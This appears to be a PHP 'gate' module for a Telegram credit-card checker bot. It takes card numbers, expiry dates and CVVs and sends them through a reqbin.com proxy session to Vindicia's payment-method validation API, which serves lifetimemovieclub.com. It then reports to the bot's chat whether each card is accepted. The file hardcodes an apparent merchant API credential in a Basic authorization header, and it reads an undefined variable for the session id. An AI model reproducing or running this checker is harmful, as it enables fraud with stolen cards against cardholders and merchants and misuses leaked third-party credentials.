<?php 

use App\Faker\{Name, Internet, Address};
use App\Models\Bot;
use App\Gate\{Make, Responses as Res};
$cookie = rand();

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$cece = implode('|', $cc);
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".$cece."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1~ #
$headers1 = ['Host: apius.reqbin.com', 'content-type: application/json'];
$post1 = '{"id":"0","name":"","errors":"","json":"{\"method\":\"GET\",\"url\":\"https://www.lifetimemovieclub.com/api/session?ts='.milliseconds().'\",\"apiNode\":\"US\",\"contentType\":\"\",\"content\":\"\",\"headers\":\"Accept: application/json\",\"errors\":\"\",\"curlCmd\":\"\",\"codeCmd\":\"\",\"jsonCmd\":\"\",\"lang\":\"\",\"auth\":{\"auth\":\"noAuth\",\"bearerToken\":\"\",\"basicUsername\":\"erwerwe@gmail.co\",\"basicPassword\":\"\",\"customHeader\":\"\",\"encrypted\":\"\"},\"compare\":false,\"idnUrl\":\"https://www.lifetimemovieclub.com/api/session?ts='.milliseconds().'\"}","deviceId":"","sessionId":""}';
$site1 = ['url' => 'https://apius.reqbin.com/api/v1/requests', 'method' => 'POST', 'post' => $post1, 'headers' => $headers1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
$fim1 = json_decode($req1->body, true);
$fim1 = json_decode($fim1['Content'], true);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, $cece, $gate['name'], $lang['wait']));

# ~ REQ 2~ #
$headers2 = ['Host: api.vindicia.com', 'accept: */*', 'authorization: Basic YWFuZGVuZXR3b3Jrc19zdWJzY3JpYmVfcHJvZF9wbXRfdXNlcjpvTWtvOTNQYw==', 'content-type: text/json', 'x-onetimelogin: '.$fim1['results']['sessionId'].'', 'x-onetimeloginhmac: '.$fim1['results']['sessionHash'].'', 'x-requested-with: XMLHttpRequest', 'referer: https://secure.vindicia.com/', 'origin: https://secure.vindicia.com'];
$site2 = ['url' => 'https://api.vindicia.com/payment_methods', 'method' => 'POST', 'post' => '{"object":"PaymentMethod","type":"CreditCard","credit_card":{"object":"CreditCard","account":"'.$cc[0].'","expiration_date":"'.$cc[2].''.$cc[1].'","cvn":"'.$cc[3].'"},"billing_address":{"object":"Address","postal_code":"10001","country":"US"},"policy":{"validate":1},"metadata":{},"currency":"USD","id":"'.$fim2['results']['sessionId'].'"}', 'headers' => $headers2, 'cookie' => null, 'proxy' => null];
$req2 = Make::Create(2, $site2, $gate, $user);
IsUnspam($req2, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], 'Response: '.$req2->body);
Res::SetParams($req2->body, $req1->body);
$res = Res::unkauth();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, $cece, $res, $ccs['bin'], $gate['name']));

function milliseconds() {
    $mt = explode(' ', microtime());
    return ((int)$mt[1]) * 1000 + ((int)round($mt[0] * 1000));
}
